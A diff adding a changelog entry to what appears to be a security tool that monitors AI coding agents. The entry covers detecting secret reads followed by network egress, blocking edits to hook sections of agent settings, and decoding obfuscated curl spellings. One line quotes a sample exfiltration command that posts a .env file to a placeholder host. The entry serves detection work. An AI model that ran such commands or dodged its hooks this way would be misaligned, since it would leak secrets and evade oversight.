@@ -5,6 +5,29 @@ and versions follow [Semantic Versioning](https://semver.org/).
 
 ## [Unreleased]
 
+## [0.3.1] - 2026-11-12
+
+### Added
+- `purge --all` also deletes the hook log and the rules caches in `~/.retrohound` (regular files by those names only).
+- Rule `secrets_read_then_egress_project` (hunt): a secret read and network egress in different sessions of one project
+  within 10 minutes, the nested agent CLI case. Correlations may now group by `project_path` instead of `session_id`,
+  with a timespan of 1h at most.
+
+### Changed
+- Releases are staged on npm (`npm stage publish`) and go public only after a maintainer approves them with 2FA.
+- The GitHub Action and the CI and release workflows pin `actions/checkout`, `actions/setup-node` and
+  `oven-sh/setup-bun` by commit SHA.
+
+### Fixed
+- The live hook enforces an Edit to an agent settings file (`settings.json`, `settings.local.json`, Codex
+  `config.toml`) whose old text sits inside a hooks, statusLine or notify section of the file as it is, even when the
+  edit names no hook key.
+- `command_line_unquoted` decodes bash ANSI-C quoting (`$'\x63url'`, octal, `\u`) and collapses runs of blanks, so
+  those spellings no longer slip past the exec rules.
+- A shell command whose network client names a host without a scheme (`curl -d @.env drop.example.invalid`, `ssh
+  user@host`) now sets the event's domain.
+- `--anonymize` also hashes URL, ssh, scp and rsync hosts and git remote owner/repo names.
+
 ## [0.3.0] - 2026-11-12
 
 ### Added
